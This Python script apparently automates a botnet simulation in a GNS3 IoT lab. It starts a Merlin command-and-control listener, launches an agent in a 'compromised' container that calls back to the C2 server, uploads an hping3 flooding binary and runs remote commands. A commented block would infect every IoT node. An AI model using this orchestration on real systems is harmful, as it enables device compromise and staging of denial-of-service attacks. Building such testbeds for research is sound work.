import re
import time
import docker
from telnetlib import Telnet
from gns3utils import *


def start_merlin_cnc_listener(hostname: str, telnet_port: int, sleep_time: float = 2) -> None:
    """ Start merlin listener.
    In the Merlin interactive console run:

    - listeners
    - use https
    - set Interface 0.0.0.0
    - start
    """

    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"listeners\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"use https\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"set Interface 0.0.0.0\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"start\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"info\n")
        time.sleep(sleep_time * 3)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


def list_merlin_cnc_connected_bots(hostname: str, telnet_port: int, sleep_time: float = 2) -> None:
    """ List connected bots.
    """

    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"agent list\n")
        time.sleep(sleep_time)
        agents_table = tn.read_very_eager().decode("utf-8")
        print(agents_table)
        return agents_table


def parse_agent_table(agent_table):
    agents = []
    uuidre = re.compile("([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
    for line in agent_table.split("\n"):
        line = line.strip()
        match = re.search(uuidre, line)
        if match:
            agents.append((match.group(1), line))
    return agents


def merlin_cnc_tool_transfer_agent(hostname: str, telnet_port: int, agent_id: str, sleep_time: float = 2) -> None:
    """ Transfer files.
    - agent interact [tab]
    - upload /opt/hping3/hping3-static /opt/hping3
    """

    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(f"agent interact {agent_id}\n".encode("ascii"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"upload /opt/hping3/hping3-static /opt/hping3\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


def merlin_cnc_remote_cmd_agent(hostname: str, telnet_port: int, agent_id: str, cmd: str, sleep_time: float = 2) -> None:
    """ Transfer files.
    - agent interact [tab]
    - upload /opt/hping3/hping3-static /opt/hping3
    """

    with Telnet(hostname, telnet_port) as tn:
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(f"agent interact {agent_id}\n".encode("ascii"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(f"run {cmd}\n".encode("ascii"))
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))

        tn.write(b"back\n")
        time.sleep(sleep_time)
        print(tn.read_very_eager().decode("utf-8"))


def exec_merlin_agent(merlin_bot_container, cnc_addr: str, cnc_port: int, cnc_sleep: int):
    """ Start merlin agent bot
    Example: '/opt/merlin/merlinAgent-Linux-x64 -url https://192.168.0.100:443 -sleep 20s'
    """
    merlin_bot_container.exec_run(f"/opt/merlin/merlinAgent-Linux-x64 -url https://{cnc_addr}:{cnc_port} -sleep {cnc_sleep}s", detach=True)
    merlin_bot_container.top()



PROJECT_NAME = "iot_sim"
check_local_gns3_config()
server = Server(*read_local_gns3_config())
project = get_project_by_name(server, PROJECT_NAME)

docker_client = docker.from_env()
docker_client.ping()

all_iot = get_nodes_id_by_name_regexp(server, project, re.compile("iotsim-.*", re.IGNORECASE))
merlin_cnc = next(filter(lambda i: i.name == "iotsim-merlin-cnc-1", all_iot))
merlin_cnc_h, merlin_cnc_p = get_node_telnet_host_port(server, project, merlin_cnc.id)

start_merlin_cnc_listener(merlin_cnc_h, merlin_cnc_p)

merlin_bot = next(filter(lambda i: "compromised" in i.name, all_iot))
container_merlin_bot = docker_client.containers.get(get_node_docker_container_id(server, project, merlin_bot.id))

exec_merlin_agent(container_merlin_bot, "192.168.34.10", 443, 20)
time.sleep(30)

agent_list = parse_agent_table(list_merlin_cnc_connected_bots(merlin_cnc_h, merlin_cnc_p))
print(agent_list)

merlin_cnc_tool_transfer_agent(merlin_cnc_h, merlin_cnc_p, agent_list[0][0])
time.sleep(30)

merlin_cnc_remote_cmd_agent(merlin_cnc_h, merlin_cnc_p, agent_list[0][0], "chmod 775 /opt/hping3")


# infect all iot
# for iot_target in all_iot:
#     print(f"* Infecting: {iot_target.name}")
#     container_bot = docker_client.containers.get(get_node_docker_container_id(server, project, iot_target.id))
#     exec_merlin_agent(container_bot, "192.168.34.10", 443, 60)
#     time.sleep(2)
